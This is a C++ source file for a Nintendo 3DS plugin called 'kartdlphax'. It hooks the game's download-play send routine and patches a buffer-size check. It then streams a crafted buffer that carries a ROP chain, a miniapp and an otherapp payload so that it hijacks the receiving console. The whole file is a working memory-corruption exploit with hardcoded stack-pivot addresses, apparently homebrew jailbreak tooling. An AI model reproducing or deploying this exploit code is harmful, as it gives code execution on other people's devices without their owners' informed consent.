#include <3ds.h>
#include "csvc.h"
#include <CTRPluginFramework.hpp>
#include "PatternManager.hpp"
#include "OSDManager.hpp"
#include "rt.h"
#include "ropbin.h"
#include "miniapp.h"
#include "otherapp.h"

#include <vector>
#include <string.h>

extern "C" {
	u32 g_sendBufferret = 0x100000;
}

static void NAKED sendBufferfunc() {
    __asm__ __volatile__
    (
        "MOV             R2, R4 \n"
        "ADD             R1, R1, R3 \n"
        "PUSH			 {R0, R2-R3, LR} \n"
        "BL				 sendBufferCallback \n"
        "MOV		     R1, R0 \n"
        "POP		     {R0, R2-R3, LR} \n"
        "LDR		     R12, =g_sendBufferret \n"
        "LDR		     PC, [R12] \n"
    );
}

namespace CTRPluginFramework
{
    LightEvent exitEvent;
    RT_HOOK sendDataHook;

    static inline u32   decodeARMBranch(const u32 *src)
	{
		s32 off = (*src & 0xFFFFFF) << 2;
		off = (off << 6) >> 6; // sign extend

		return (u32)src + 8 + off;
	}

    static inline int roundUp(int numToRound, int multiple) 
    {
        return ((numToRound + multiple - 1) / multiple) * multiple;
    }

    void    PatchProcess(FwkSettings &settings)
    {
        const u8 getBufferSizePat[] = {0x09, 0x40, 0x20, 0x10, 0x29, 0x00, 0x56, 0xE3, 0xB1, 0x00, 0x00, 0x0A, 0x29, 0x00, 0xA0, 0xE3};
        const u8 sendBufferDataPat[] = {0x08, 0x00, 0x87, 0xE2, 0x94, 0x06, 0x03, 0xE0, 0x03, 0x10, 0x41, 0xE0, 0x04, 0x00, 0x51, 0xE1};

        PatternManager pm;

        pm.Add(getBufferSizePat, 0x10, [](u32 addr) {
			u32 func = decodeARMBranch((u32*)(addr + 0x248)) + 0x10;
			*((u32*)func) = 0xE3A03207; // Tell the game the output buffer is giant (0x70000000)
			return true;
		});

        pm.Add(sendBufferDataPat, 0x10, [](u32 addr) {
			rtInitHook(&sendDataHook, addr + 0x18, (u32)sendBufferfunc);
			rtEnableHook(&sendDataHook);
			g_sendBufferret = addr + 0x18 + 0x8;
			return true;
		});

        pm.Perform();
    }

    

	u8 corruptBuffer[0x37C] = { 0 };

    static constexpr u32 ORIGSTACK = 0x0FFFFDC8;
    static constexpr u32 PLUGINBUFFERSIZE = 0x249CF8; //~2.4MB
    static constexpr u32 STARTBUFFER = 0x1424FDB4;
    static constexpr u32 ROPBUF = 0x14250000;
    static constexpr u32 MINIAPPBUF = 0x14253000;
    static constexpr u32 OTHERAPPBUF = STARTBUFFER + 0x37C * 16; // Block 16 - rest

    static u8* exploitBuffer = nullptr;

	u32 sendBufferCallback(u32 dst, u32 src, u32 size) { // size always 0x37C
		static u32 currval = 0;
        static u32 buffstart = src;
		if (currval == 0x1740) {
			u32* buf = (u32*)corruptBuffer;
			buf[0x35] = 0x14760190;
			buf[0x37] = 0;
			buf[0x38] = 0;
			buf[0x39] = 0;
			buf[0x3A] = 0x0012E54C;

			buf[0x11] = ROPBUF - ORIGSTACK - 2;
			buf[0x43] = 0x147601C0;
			buf[0x49] = 0x00113688;
			currval++;
			return (u32)corruptBuffer;
		}
        if (currval < 0x1740)
            OSDManager["t"].SetScreen(false).SetPos(15,21) = Utils::Format("Sending hax: %.2f%%", ((float)currval / 0x1740) * 100.f);
        else
            OSDManager["t"].SetScreen(false).SetPos(15,21) = "Done!";
        currval++;
        if (currval >= 0x174F) { Sleep(Seconds(1.f)); Process::ReturnToHomeMenu(); }
        if (currval * 0x37C < PLUGINBUFFERSIZE)
		    return (u32)exploitBuffer + (src - buffstart);
        else
            return src;
	}
    int usedotherapp;
    void    constructExploitBuffer() {
        exploitBuffer = (u8*)::operator new(PLUGINBUFFERSIZE);
        if (!exploitBuffer) svcBreak(USERBREAK_USER);
        memcpy((exploitBuffer + ROPBUF - STARTBUFFER), payload_bin, payload_bin_size);
        memcpy((exploitBuffer + MINIAPPBUF - STARTBUFFER), miniapp_bin, miniapp_bin_size);
        File otherapp("/kartdlphax_otherapp.bin", File::READ);
        u32 otherappsize;

        if (otherapp.IsOpen())
        {
            usedotherapp = 0;
            otherappsize = otherapp.GetSize();
            otherapp.Read((exploitBuffer + OTHERAPPBUF - STARTBUFFER), otherappsize);
        } else {
            usedotherapp = 1;
            otherappsize = otherapp_bin_size;
            memcpy((exploitBuffer + OTHERAPPBUF - STARTBUFFER), otherapp_bin, otherappsize);
        }

        otherappsize = roundUp(otherappsize, 0x37C);
        u32 repeatTimes = (PLUGINBUFFERSIZE - (OTHERAPPBUF - STARTBUFFER)) / otherappsize;
        for (int i = 0; i < otherappsize / 0x37C; i++) {
            u32* first = (u32*)((exploitBuffer + OTHERAPPBUF - STARTBUFFER) + 0x37C * i);
            if (first[0] == 0)
                first[0] = 0x05500000;
        }
        for (int i = 1; i < repeatTimes; i++) {
            memcpy((exploitBuffer + OTHERAPPBUF - STARTBUFFER) + otherappsize * i, (exploitBuffer + OTHERAPPBUF - STARTBUFFER), otherappsize);
        };
        ((u32*)exploitBuffer)[0] = otherappsize;
        ((u32*)exploitBuffer)[1] = repeatTimes;
    }

    // This function is called when the process exits
    // Useful to save settings, undo patchs or clean up things
    void    OnProcessExit(void)
    {
        LightEvent_Signal(&exitEvent);
    }

    int     main(void)
    {
        LightEvent_Init(&exitEvent, RESET_ONESHOT);
        constructExploitBuffer();
        OSD::Notify("Welcome!");
        OSD::Notify("kartdlphax v1.0");
        if (usedotherapp == 0)
        {
            OSD::Notify("Using otherapp file from SD.");
        } else if (usedotherapp == 1) {
            OSD::Notify("Using built-in universal otherapp.");
        }
        // Wait for process exit event.
        LightEvent_Wait(&exitEvent);
        ::operator delete(exploitBuffer);
        // Exit plugin
        return (0);
    }
}

extern "C" {u32 sendBufferCallback(u32 dst, u32 src, u32 size);}
u32 sendBufferCallback(u32 dst, u32 src, u32 size) {
	return CTRPluginFramework::sendBufferCallback(dst, src, size);
}
